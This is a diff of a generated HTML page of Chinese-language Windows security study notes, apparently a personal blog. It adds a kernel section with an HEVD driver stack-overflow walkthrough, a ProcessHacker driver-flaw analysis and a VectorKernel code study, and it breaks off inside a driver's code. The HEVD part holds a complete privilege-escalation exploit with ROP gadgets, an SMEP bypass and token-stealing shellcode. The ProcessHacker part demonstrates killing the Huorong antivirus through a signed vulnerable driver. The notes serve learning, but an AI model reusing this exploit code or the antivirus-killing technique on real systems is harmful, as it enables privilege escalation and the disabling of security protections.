@@ -85,25 +85,33 @@
           ]},
           {title: "APC", url: "#apc", children: [
           ]},
+          {title: "\u5185\u6838\u5b66\u4e60", url: "#_39", children: [
+              {title: "HEVD\u9a71\u52a8\u7ec3\u4e60", url: "#hevd" },
+              {title: "ProcessHacker\u9a71\u52a8\u6f0f\u6d1e\u5206\u6790", url: "#processhacker" },
+              {title: "VectorKernel\u5de5\u5177\u5b66\u4e60", url: "#vectorkernel" },
+          ]},
           {title: "Windbg", url: "#windbg", children: [
-              {title: "\u5e38\u7528\u547d\u4ee4", url: "#_39" },
+              {title: "\u5e38\u7528\u547d\u4ee4", url: "#_45" },
               {title: "debug kernel", url: "#debug-kernel" },
           ]},
-          {title: "\u4e66\u7c4d\u5de5\u5177", url: "#_40", children: [
+          {title: "\u4e66\u7c4d\u5de5\u5177", url: "#_46", children: [
               {title: "Reverse Engineering for Beginners", url: "#reverse-engineering-for-beginners" },
               {title: "Windows \u4ee4\u724c\u76f8\u5173\u5b66\u4e60", url: "#windows_1" },
-              {title: "\u5de5\u5177", url: "#_41" },
-              {title: "\u53c2\u8003\u8d44\u6599", url: "#_43" },
+              {title: "\u5de5\u5177", url: "#_47" },
+              {title: "\u53c2\u8003\u8d44\u6599", url: "#_49" },
           ]},
-          {title: "\u547d\u4ee4", url: "#_44", children: [
+          {title: "\u547d\u4ee4", url: "#_50", children: [
+              {title: "pattern", url: "#pattern" },
+              {title: "nasm", url: "#nasm" },
+              {title: "Ropper", url: "#ropper" },
           ]},
-          {title: "\u5de5\u5177", url: "#_45", children: [
+          {title: "\u5de5\u5177", url: "#_51", children: [
               {title: "boofuzz\u4f7f\u7528", url: "#boofuzz" },
               {title: "x64dbg\u5b89\u88c5mona\u63d2\u4ef6", url: "#x64dbgmona" },
           ]},
-          {title: "\u4e66\u7c4d", url: "#_46", children: [
+          {title: "\u4e66\u7c4d", url: "#_52", children: [
           ]},
-          {title: "\u518d\u770b", url: "#_47", children: [
+          {title: "\u518d\u770b", url: "#_53", children: [
           ]},
         ];
 
@@ -130,12 +138,12 @@ if (is_top_frame) { $('body').addClass('wm-top-page'); }
   <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
     
     <div class="wm-article-nav pull-right">
-      <a href="../Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/" class="btn btn-xs btn-default pull-right">
+      <a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-default pull-right">
         Next
         <i class="fa fa-chevron-right" aria-hidden="true"></i>
       </a>
-      <a href="../Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/" class="btn btn-xs btn-link">
-        Windows API示例大全
+      <a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-link">
+        Linux安全笔记
       </a>
     </div>
     
@@ -1334,10 +1342,777 @@ typedef NT_TIB *PNT_TIB;
 - 特殊用户APC: RS5(windows10 October 2018)中添加的一种相对较新的APC类型，强制线程进入Alertable。(MS尚未证实)</p>
 <p>用户模式下，只有当线程处于<code>Alertable</code>、<code>NtTestAlert(测试)</code>状态时，才会触发APC，使用APC注入，需要让进程处于以上状态。</p>
 <p>特殊用户APC使用<code>NtQueueApcThreadEx</code>、<code>NtQueueApcThreadEx2</code> </p>
+<h2 id="_39">内核学习</h2>
+<h3 id="hevd">HEVD驱动练习</h3>
+<p>通过输入输出控制 （IOCTL） 访问设备驱动程序。
+使用<code>DeviceIoControl()</code>函数向驱动对象发送消息。</p>
+<p>安装驱动。由于是无签名的，Windows会阻止启动驱动，需要在Windows debug模式下启动</p>
+<pre><code>sc create HEVD binPath= C:\Users\admin\Desktop\x64\HEVD.sys type= kernel
+sc start HEVD
+</code></pre>
+<p>驱动已加载
+<img alt="" src="../../images/Snipaste_2023-12-12_17-19-21.jpg" /></p>
+<p><img alt="" src="../../images/Snipaste_2023-12-12_17-21-08.jpg" /></p>
+<h4 id="0x800">0x800 缓冲区溢出</h4>
+<p>缓冲区溢出，产生问题的函数是<code>TriggerBufferOverflowStack</code>。</p>
+<p>找到函数地址
+<img alt="" src="../../images/Snipaste_2023-12-12_17-26-28.jpg" /></p>
+<p>在函数返回处下断点，运行Poc观察寄存器的值
+<img alt="" src="../../images/Snipaste_2023-12-12_17-27-54.jpg" /></p>
+<p>打蓝屏Poc</p>
+<pre><code class="language-C++">#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;Windows.h&gt;
+
+#define DEVICE_NAME &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;   //驱动对象路径
+//#define DEVICE_NAME   &quot;\\Device\\HackSysExtremeVulnerableDriver&quot;    
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) // 一个宏，从编号获取IOCTL
+#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)   //产生问题的驱动IOCTL编号0x800
+
+using namespace std;
+
+
+HANDLE get_handle() {
+    HANDLE h = CreateFileA(DEVICE_NAME,
+        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+        NULL);
+     //CreateFileA 打开驱动对象返回句柄
+
+    if (h == INVALID_HANDLE_VALUE) {
+        printf(&quot;Failed to get handle =(\n&quot;);
+        return NULL;
+    }
+    else {
+        printf(&quot;Success to get handle,0x%x&quot;,h);
+    }
+    return h;
+}
+
+//get_handle函数从驱动对象路径中获取句柄
+
+
+
+void do_buffer_overflow(HANDLE h)
+{
+    SIZE_T in_buffer_size = 0x1000;     
+    PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);   //分配堆空间
+    memset((char*)in_buffer, 'A', in_buffer_size);   //往堆中写入0x1000个A
+    printf(&quot;Sending buffer.\n&quot;);
+    bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);  //使用DeviceIoControl()往指定编号的驱动对象发送数据
+    if (!result)
+    {
+        printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
+    }
+    HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+
+
+int main()
+{
+    HANDLE h = get_handle();
+    do_buffer_overflow(h);
+    //std::cout &lt;&lt; &quot;Hello World!\n&quot;;
+}
+
+
+</code></pre>
+<p>观察运行Poc后寄存器的值，多个寄存器的值被覆盖，rsp处的代码被覆盖</p>
+<p><img alt="" src="../../images/Snipaste_2023-12-12_17-32-13.jpg" /></p>
+<p>蓝屏
+<img alt="" src="../../images/Snipaste_2023-12-12_17-34-53.jpg" /></p>
+<p>没有溢出到rsp，而是溢出到rsp的地址</p>
+<p>尝试找出溢出位置
+<img alt="" src="../../images/Snipaste_2023-12-13_11-05-51.jpg" /></p>
+<p>查看rsp地址的值已经被覆盖</p>
+<pre><code class="language-c">1: kd&gt; d fffff88b53f177b8
+fffff88b`53f177b8  30 43 72 31 43 72 32 43-72 33 43 72 34 43 72 35  0Cr1Cr2Cr3Cr4Cr5
+fffff88b`53f177c8  43 72 36 43 72 37 43 72-38 43 72 39 00 00 00 00  Cr6Cr7Cr8Cr9....
+fffff88b`53f177d8  18 00 00 00 00 00 00 00-01 00 00 00 00 00 00 00  ................
+fffff88b`53f177e8  53 52 42 85 04 f8 ff ff-10 15 5b 6c 85 a4 ff 7f  SRB.......[l....
+fffff88b`53f177f8  ff ff ff ff 00 00 00 00-d0 82 42 85 04 f8 ff ff  ..........B.....
+fffff88b`53f17808  03 20 22 00 00 00 00 00-c0 70 5b 6c 85 a4 ff ff  . &quot;......p[l....
+fffff88b`53f17818  79 8f 03 80 04 f8 ff ff-c0 42 52 6b 85 a4 ff ff  y........BRk....
+fffff88b`53f17828  02 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+</code></pre>
+<pre><code class="language-bash">┌──(root💀kali)-[~]
+└─# msf-pattern_offset -q 31724330
+[*] Exact match at offset 2072
+</code></pre>
+<p>由此可以知道溢出点在2072个字符后。</p>
+<p>SMEP的干扰
+Supervisor Mode Execition Prevention（SMEP）是在内核模式下的一种安全机制，不允许在某些内存空间执行代码，否则会直接蓝屏。</p>
+<p>如何绕过
+- ROP绕过
+- KPTI绕过
+    如果系统启用了 KPTI，则恶意代码无法直接访问内核内存。但是，恶意代码仍然可以通过漏洞或其他攻击方式修改内核内存映射表。如果恶意代码成功修改了内核内存映射表，则恶意代码仍然可以访问内核内存</p>
+<p>流程
+- 使用<code>ExAllocatePoolWithTag()</code>分配可执行的不可分页内存池
+- 使用<code>RtlCopyMemory</code>从用户模式复制shellcode
+    需要从ntoskrnl获取函数地址才可使用两个函数
+- 重定向执行流</p>
+<p>为了从随机地址空间中获取函数的地址，需要通过Psapi来枚举指定驱动的镜像基址</p>
+<pre><code class="language-C">#include &lt;Windows.h&gt;
+#include &lt;Psapi.h&gt;
+...
+unsigned long long get_kernel_base_addr() {
+    LPVOID drivers[1024];
+    DWORD cbNeeded;
+
+    EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded);
+
+    return (unsigned long long)drivers[0];
+}
+</code></pre>
+<p>通过函数名称获取详细地址</p>
+<pre><code class="language-C">PVOID get_kernel_symbol_addr(const char *symbol) {
+    PVOID kernelBaseAddr;
+    HMODULE userKernelHandle;
+    PCHAR functionAddress;
+    unsigned long long offset;
+
+    kernelBaseAddr = (PVOID)get_kernel_base_addr();  // 通过get_kernel_base_addr获取镜像基址
+    userKernelHandle = LoadLibraryA(&quot;C:\\Windows\\System32\\ntoskrnl.exe&quot;);  // 获取ntoskrnl句柄
+
+    if (userKernelHandle == INVALID_HANDLE_VALUE) {
+
+        return NULL;
+    }
+
+    functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);  // 根据符号名称（函数名称）获取地址
+    if (functionAddress == NULL) {
+        return NULL;
+    }
+
+    offset = functionAddress - ((PCHAR)userKernelHandle);  // 函数地址-ntoskrnl句柄初始地址 = 函数偏移量
+    return (PVOID)(((PCHAR)kernelBaseAddr) + offset);  // 返回当前内存中的函数实际地址，当前镜像基址+函数偏移量
+}
+</code></pre>
+<p>exp代码，提权</p>
+<pre><code class="language-C">#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;Windows.h&gt;
+#include &lt;Psapi.h&gt;
+
+// Name of the device
+#define DEVICE_NAME &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+
+//定义ROP指令
+unsigned long long g_add_rsp_20h_ret = 0xa155de;
+
+
+unsigned long long g_pop_rdi_pop_r14_pop_rbx_ret = 0x20a518;
+unsigned long long g_xor_ecx_ecx_mov_rax_rcx_ret = 0x38cf53;
+unsigned long long g_pop_rdx_ret = 0x416748;
+unsigned long long g_push_rax_pop_rbx_ret = 0x20a263;
+unsigned long long g_push_rax_pop_r13_ret = 0x5af724;
+unsigned long long g_xchg_r8_r13_ret = 0x2c0da6;
+unsigned long long g_mov_rcx_r8_mov_rax_rcx_ret = 0x93ac7a;
+unsigned long long g_pop_r8_ret = 0x2017f1;
+unsigned long long g_jmp_rbx = 0x408aa2;
+unsigned long long kernel_ExAllocatePoolWithTag;
+unsigned long long kernel_sysret = 0xa13dc0;
+unsigned long long kernel_memcpy;
+
+
+
+
+DWORD pid;
+
+typedef struct sSepTokenPrivileges {
+    UINT8 present;
+    UINT8 enabled;
+    UINT8 enabled_by_default;
+} SEP_TOKEN_PRIVILEGES;
+
+typedef NTSTATUS(*_PsLookupProcessByProcessId)(IN HANDLE, OUT PVOID*);
+_PsLookupProcessByProcessId kernel_PsLookupProcessByProcessId;
+
+typedef PVOID(*_PsReferencePrimaryToken)(PVOID);
+_PsReferencePrimaryToken kernel_PsReferencePrimaryToken;
+
+
+// 枚举驱动镜像基址
+unsigned long long get_kernel_base_addr() {
+    LPVOID drivers[1024];
+    DWORD cbNeeded;
+
+    EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded);
+
+    return (unsigned long long)drivers[0];
+}
+
+// 打开驱动对象，获取驱动句柄
+HANDLE get_handle() {
+    HANDLE h = CreateFileA(DEVICE_NAME,
+        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (h == INVALID_HANDLE_VALUE) {
+        printf(&quot;Failed to get handle =(\n&quot;);
+        return NULL;
+    }
+    return h;
+}
+
+// 复制ROP payload
+void add_to_payload(char* in_buffer, SIZE_T* offset, unsigned long long* data, SIZE_T size)
+{
+    memcpy(in_buffer + *offset, data, size);
+    printf(&quot;Wrote %lx to offset %u\n&quot;, *data, *offset);
+    *offset += size;
+}
+
+//获取函数的内存地址
+PVOID get_kernel_symbol_addr(const char* symbol) {
+    PVOID kernelBaseAddr;
+    HMODULE userKernelHandle;
+    PCHAR functionAddress;
+    unsigned long long offset;
+
+    kernelBaseAddr = (PVOID)get_kernel_base_addr();  // Loads kernel base address
+    userKernelHandle = LoadLibraryA(&quot;C:\\Windows\\System32\\ntoskrnl.exe&quot;);  // Gets kernel binary
+
+    if (userKernelHandle == INVALID_HANDLE_VALUE) {
+        return NULL;
+    }
+
+    functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);  // Finds given symbol
+    if (functionAddress == NULL) {
+        // Could not find symbol
+        return NULL;
+    }
+
+    offset = functionAddress - ((PCHAR)userKernelHandle);  // Subtracts the loaded binary's base address from the found address. This way, we will find the offset of the symbol for base address 0.
+    return (PVOID)(((PCHAR)kernelBaseAddr) + offset);  // Adds the offset to the leaked base address.
+}
+
+void adjust_offsets()
+{
+    unsigned long long kernel_base_addr = get_kernel_base_addr();
+    g_xor_ecx_ecx_mov_rax_rcx_ret += kernel_base_addr;
+    g_pop_rdi_pop_r14_pop_rbx_ret += kernel_base_addr;
+    g_add_rsp_20h_ret += kernel_base_addr;
+    g_pop_rdx_ret += kernel_base_addr;
+    g_push_rax_pop_rbx_ret += kernel_base_addr;
+    g_push_rax_pop_r13_ret += kernel_base_addr;
+    g_xchg_r8_r13_ret += kernel_base_addr;
+    g_mov_rcx_r8_mov_rax_rcx_ret += kernel_base_addr;
+    g_pop_r8_ret += kernel_base_addr;
+    g_jmp_rbx += kernel_base_addr;
+
+    kernel_sysret += kernel_base_addr;
+    kernel_ExAllocatePoolWithTag = (unsigned long long) get_kernel_symbol_addr(&quot;ExAllocatePoolWithTag&quot;);
+    kernel_memcpy = (unsigned long long) get_kernel_symbol_addr(&quot;memcpy&quot;);
+    kernel_PsLookupProcessByProcessId = (_PsLookupProcessByProcessId)get_kernel_symbol_addr(&quot;PsLookupProcessByProcessId&quot;);
+    kernel_PsReferencePrimaryToken = (_PsReferencePrimaryToken)get_kernel_symbol_addr(&quot;PsReferencePrimaryToken&quot;);
+    printf(&quot;Primary token: %xu \n&quot;, (ULONGLONG)kernel_PsReferencePrimaryToken - kernel_base_addr);
+    printf(&quot;PsReferencePrimaryToken base addr: %xu\n&quot;, (ULONGLONG)kernel_PsReferencePrimaryToken - (ULONGLONG)kernel_base_addr);
+}
+
+
+DWORD spawnCmd() {
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    wchar_t cmd[] = L&quot;C:\\Windows\\System32\\cmd.exe&quot;;
+
+    ZeroMemory(&amp;si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&amp;pi, sizeof(pi));
+
+    // Start the child process. 
+    if (!CreateProcessW(NULL,   // No module name (use command line)
+        cmd,                    // Command line
+        NULL,                   // Process handle not inheritable
+        NULL,                   // Thread handle not inheritable
+        FALSE,                  // Set handle inheritance to FALSE
+        CREATE_NEW_CONSOLE,     // No creation flags
+        NULL,                   // Use parent's environment block
+        NULL,                   // Use parent's starting directory 
+        &amp;si,                    // Pointer to STARTUPINFO structure
+        &amp;pi)                    // Pointer to PROCESS_INFORMATION structure
+        )
+    {
+        printf(&quot;CreateProcess failed (%d).\n&quot;, GetLastError());
+        return -1;
+    }
+
+    return pi.dwProcessId;
+}
+
+//执行ROP代码后返回用户空间的shellcode，否则系统会蓝屏
+char* generate_shellcode() {
+    char* shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x4e + 11);
+    memcpy(shellcode, &quot;\x48\xc7\xc1\x78\x56\x34\x12\x48\x83\xec\x08\x48\x89\xe2\x48\xbb\x00\x00\x00\x00\xff\xff\xff\xff\xff\xd3\x48\x8b\x0c\x24\x48\xbb\x10\x32\x34\x12\xff\xff\xff\xff\xff\xd3\x48\x83\xc0\x40\x48\xb9\xfc\xff\xff\xff\x00\x00\x00\x00\x48\x89\x08\x48\x83\xc0\x08\x48\x89\x08\x48\x83\xc0\x08\x48\x89\x08\x48\x83\xc4\x08\x48\xBB\xC0\x0D\x02\x1B\x05\xF8\xFF\xFF\xFF\xE3&quot;, 0x4e + 11); 
+    memcpy(shellcode + 3, &amp;pid, 4);
+    memcpy(shellcode + 16, &amp;kernel_PsLookupProcessByProcessId, 8);
+    memcpy(shellcode + 32, &amp;kernel_PsReferencePrimaryToken, 8);
+    memcpy(shellcode + 0x4e + 1, &amp;kernel_sysret, 8);
+    return shellcode;
+}
+
+//Does everything
+void do_buffer_overflow(HANDLE h)
+{
+    SIZE_T in_buffer_size = 2072 + 8 * 15 + 0x20;
+    PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+    memset((char*)in_buffer, 'A', in_buffer_size);
+
+    SIZE_T offset = 2072;
+
+    pid = spawnCmd();
+    adjust_offsets();
+    char* shellcode = generate_shellcode();
+
+    unsigned long long size_of_copy = 0x4e + 11;
+
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_xor_ecx_ecx_mov_rax_rcx_ret, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_pop_rdx_ret, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;size_of_copy, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;kernel_ExAllocatePoolWithTag, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_add_rsp_20h_ret, 8);
+    offset += 0x20;
+
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_push_rax_pop_rbx_ret, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_push_rax_pop_r13_ret, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_xchg_r8_r13_ret, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_mov_rcx_r8_mov_rax_rcx_ret, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_pop_rdx_ret, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, (unsigned long long*)(&amp;shellcode), 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_pop_r8_ret, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;size_of_copy, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;kernel_memcpy, 8);
+    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_jmp_rbx, 8);
+
+
+    system(&quot;pause&quot;);
+    printf(&quot;Sending buffer.\n&quot;);
+    bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+    if (!result)
+    {
+        printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
+    }
+    //Frees allocated memory
+    HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+
+
+int main(int argc, char** argv)
+{
+    do_buffer_overflow(get_handle());
+    system(&quot;pause&quot;);
+}
+</code></pre>
+<h3 id="processhacker">ProcessHacker驱动漏洞分析</h3>
+<h4 id="_40">介绍</h4>
+<p>ProcessHacker的2.8.0.0版本的驱动程序<code>kprocesshacker.sys</code>存在漏洞，该驱动是数字签名的，利用驱动漏洞可以在R0下结束进程、暂停进程，且可结束自我防护不严格的杀毒软件。</p>
+<h4 id="_41">目的</h4>
+<p>以漏洞利用工具入手，分析漏洞点以增强知识理解和调试熟练度</p>
+<h4 id="_42">寻找漏洞点</h4>
+<p>先检验一下ProcessHacker能否杀火绒
+<img alt="" src="../../images/Snipaste_2023-12-13_15-33-14.jpg" /></p>
+<p>火绒直接被杀了且没有重新启动
+<img alt="" src="../../images/Snipaste_2023-12-13_15-33-54.jpg" /></p>
+<p>既然是结束进程，可能用到了<code>ZwTerminateProcess</code>。
+也有其他使用非公开内核函数的方法来结束进程，但一般正常的工具应该不会那样做。</p>
+<p>为了证实这一点，可以调试一下结束进程操作是否真的调用了<code>ZwTerminateProcess</code>.</p>
+<p>在<code>kprocesshacker</code>和<code>ntdll!ZwTerminateProcess</code>处下断点，当使用ProcessHacker结束进程时，成功断在<code>ZwTerminateProcess</code>函数调用处
+<img alt="" src="../../images/Snipaste_2023-12-13_16-58-32.jpg" /></p>
+<p>没有符号表，需要静态分析出函数的位置，找出驱动中函数偏移量.
+由于我没有找到2.8.0.0版本驱动的ProcessHacker的文件，用的是其他版本进行调试。
+当我尝试用其他版本的exe加载2.8.0.0的sys文件时，虽然exe可以正常使用，但是经过调试后发现sys文件似乎没有被正确调用，因为ProcessHacker用的自己而不是驱动来调用ZwTerminateProcess。看来exe和sys是配对的
+<img alt="" src="../../images/Snipaste_2023-12-13_20-34-06.jpg" /></p>
+<p>下断点<code>bp kprocesshacker+0x68f1</code>
+<img alt="" src="../../images/Snipaste_2023-12-13_20-31-35.jpg" /></p>
+<p>来找一下<code>kprocesshacker.sys</code>结束进程的内核级别函数<code>ZwTerminateProcess</code></p>
+<p>搜索<code>ZwTerminateProcess</code>可以看到被函数<code>FUN_00017e78</code>调用了，那么<code>FUN_00017e78</code>是不是造成漏洞的主要原因呢
+<img alt="" src="../../images/Snipaste_2023-12-13_15-36-08.jpg" />
+在看<code>FUN_00017e78</code>的反汇编之前先看看<code>ZwTerminateProcess</code>函数原型</p>
+<p><code>ZwTerminateProcess</code>接受2个参数，第一个是进程的句柄，第二个是进程的退出状态。简单粗暴</p>
+<pre><code class="language-C">NTSTATUS ZwTerminateProcess(
+  _In_ HANDLE ProcessHandle,
+  _In_ NTSTATUS ExitStatus
+);
+</code></pre>
+<p>如果是结束进程可以被控制，那想必第一个参数<code>ProcessHandle</code>肯定可以被控制。</p>
+<p><code>FUN_00017e78</code>函数反汇编如下</p>
+<p><img alt="" src="../../images/Snipaste_2023-12-13_16-03-26.jpg" /></p>
+<pre><code class="language-C">ulonglong FUN_00017e78(undefined8 param_1,undefined4 param_2,undefined param_3)
+
+{
+  longlong lVar1;
+  uint uVar2;
+  ulonglong uVar3;
+  longlong lVar4;
+  code *pcVar5;
+  longlong local_res20;
+  ulonglong uVar6;
+  undefined8 local_18 [2];
+
+  uVar6 = 0;
+  uVar3 = ObReferenceObjectByHandle
+                    (param_1,0,*(undefined8 *)PsProcessType_exref,param_3,&amp;local_res20,0);
+  if ((int)uVar3 &lt; 0) {
+    return uVar3;
+  }
+  lVar4 = IoGetCurrentProcess();
+  lVar1 = local_res20;
+  if (local_res20 == lVar4) {
+    uVar3 = 0xc00000db;
+  }
+  else {
+    if ((DAT_00014334 == 0) &amp;&amp; (pcVar5 = (code *)FUN_00011bac(&amp;DAT_000141c0), pcVar5 != (code *)0x0)
+       ) {
+      uVar2 = (*pcVar5)(lVar1,param_2);
+      uVar3 = (ulonglong)uVar2;
+      if (uVar2 != 0xc00000bb) goto LAB_00017f58;
+    }
+    uVar2 = ObOpenObjectByPointer
+                      (local_res20,0x200,0,1,*(undefined8 *)PsProcessType_exref,
+                       uVar6 &amp; 0xffffffffffffff00,local_18);
+    uVar3 = (ulonglong)uVar2;
+    if (-1 &lt; (int)uVar2) {
+      uVar2 = ZwTerminateProcess(local_18[0],param_2);
+      uVar3 = (ulonglong)uVar2;
+      ZwClose(local_18[0]);
+    }
+  }
+LAB_00017f58:
+  ObfDereferenceObject(local_res20);
+  return uVar3;
+}
+</code></pre>
+<p>代码读得头昏脑胀？没关系，这种事情可以交给GPT。</p>
+<p>简而言之，<code>FUN_00017e78</code>将第一个参数传入了<code>ObReferenceObjectByHandle</code>，该函数是打开进程对象，并返回一个句柄。<code>ObReferenceObjectByHandle</code>将返回的句柄存到了<code>local_18</code>数组的第一个元素。而<code>ZwTerminateProcess</code>接受<code>local_18</code>的第一个元素作为结束的进程句柄传入。</p>
+<p>所以只需要控制<code>FUN_00017e78</code>函数的第一个参数就可以利用驱动直接结束进程。</p>
+<p>知道了漏洞原因，再来看看利用工具是怎么实现的。</p>
+<h4 id="_43">利用工具分析</h4>
+<p>https://github.com/MrEmpy/Reaper
+工具几个函数如图
+主要功能函数包括加载驱动、卸载驱动、暂停进程、结束进程。
+<img alt="" src="../../images/Snipaste_2023-12-13_16-05-39.jpg" /></p>
+<p>来试一下工具的效果吧！
+如下图杀了火绒2个进程，火绒已经被杀没了。
+<img alt="" src="../../images/Snipaste_2023-12-13_21-40-45.jpg" />
+这个工具每次结束一个进程都会停止驱动，火绒存在多个进程，若要实战需要改一下程序。
+总而言之，这是可以正确地杀死火绒的。</p>
+<p>来用windbg跟一下。
+首先在2.8.0.0版本的sys找到函数偏移量
+<img alt="" src="../../images/Snipaste_2023-12-13_21-44-20.jpg" />
+下断点
+<img alt="" src="../../images/Snipaste_2023-12-13_21-45-39.jpg" /></p>
+<p>执行reaper成功在函数处断下,rcx是进程句柄，rdx是退出状态
+<img alt="" src="../../images/Snipaste_2023-12-13_21-53-41.jpg" /></p>
+<p>这个工具首先使用<code>DeployDriver</code>加载sys驱动并设置对象路径<code>\\.\KProcessHacker2</code>, 然后通过指定的PID使用<code>OpenProcess</code>获取要操作的进程句柄。
+而最核心的在于这两行相应功能的<code>IOCTL</code>编号，这也是漏洞存在的点</p>
+<pre><code>#define IOCTL_CODE_KILLPROCESS 0x999920df
+#define IOCTL_CODE_SUSPENDPROC 0x999920d7
+</code></pre>
+<p>接着通过<code>DeviceIoControl</code>函数操作驱动对象，往相应的<code>IOCTL</code>发送了<code>ioInput</code>结构体，这个结构体包含进程句柄和退出状态。也正是<code>ZwTerminateProcess</code>所接收的参数。</p>
+<p>最后利用驱动的功能，执行了我们想要的结果。</p>
+<h4 id="_44">尾声</h4>
+<p>关于漏洞点，也就是<code>IOCTL</code>编号为什么是这个，还需要进一步研究。</p>
+<h3 id="vectorkernel">VectorKernel工具学习</h3>
+<p>互联网冲浪时发现的一个项目，作者写了含多个自定义功能的sys驱动，并用C#程序调用驱动。
+来看看这个工具。
+项目地址 https://github.com/daem0nc0re/VectorKernel</p>
+<h4 id="blocknewproc">BlockNewProc</h4>
+<p>阻止创建新进程</p>
+<p>先创建一个驱动服务</p>
+<pre><code>sc create BlockNewProc binPath= C:\Users\admin\Desktop\VectorKernel\BlockNewProcClient type= kernel
+</code></pre>
+<p>禁用了<code>notepad.exe</code>，notepad已经不能启动了
+<img alt="" src="../../images/Snipaste_2023-12-14_14-27-59.jpg" />
+取消禁用，又可以启动了
+<img alt="" src="../../images/Snipaste_2023-12-14_14-29-36.jpg" /></p>
+<p>看看sys代码是怎么实现的。</p>
+<p>驱动主函数<code>DriverEntry</code>。</p>
+<pre><code class="language-C">NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+
+    //各种初始化，仅支持64位系统
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    NTSTATUS ntstatus = STATUS_FAILED_DRIVER_ENTRY;
+    PDEVICE_OBJECT pDeviceObject = nullptr;
+
+#ifndef _WIN64
+    KdPrint((DRIVER_PREFIX &quot;32bit OS is not supported.\n&quot;));
+    return STATUS_NOT_SUPPORTED;
+#endif
+
+    do
+    {
+        UNICODE_STRING devicePath = RTL_CONSTANT_STRING(DEVICE_PATH);
+        UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH);
+
+    //互斥锁
+        ::ExInitializeFastMutex(&amp;g_FastMutex);
+
+    //创建驱动
+        ntstatus = ::IoCreateDevice(
+            DriverObject,
+            NULL,
+            &amp;devicePath,
+            FILE_DEVICE_UNKNOWN,
+            NULL,
+            FALSE,
+            &amp;pDeviceObject);
+
+
+        if (!NT_SUCCESS(ntstatus))
+        {
+            pDeviceObject = nullptr;
+            KdPrint((DRIVER_PREFIX &quot;Failed to create device (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
+            break;
+        }
+
+    //创建符号链接
+        ntstatus = ::IoCreateSymbolicLink(&amp;symlinkPath, &amp;devicePath);
+
+        if (!NT_SUCCESS(ntstatus))
+        {
+            KdPrint((DRIVER_PREFIX &quot;Failed to create symbolic link (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
+            break;
+        }
+
+    //驱动注册
+    //设置major功能处理程序。
+    //major 功能处理程序是驱动程序处理 IRP 请求的函数。IRP请求需要用到这个函数。
+    // I/O 请求有不同的类型，每个类型都有一个对应的 major 功能
+
+    //将驱动卸载程序设置为DriverUnload函数
+        DriverObject-&gt;DriverUnload = DriverUnload; 
+
+    //设置创建设备的IRP请求函数为OnCreateClose
+        DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
+    //设置关闭设备的IRP请求函数为OnCreateClose
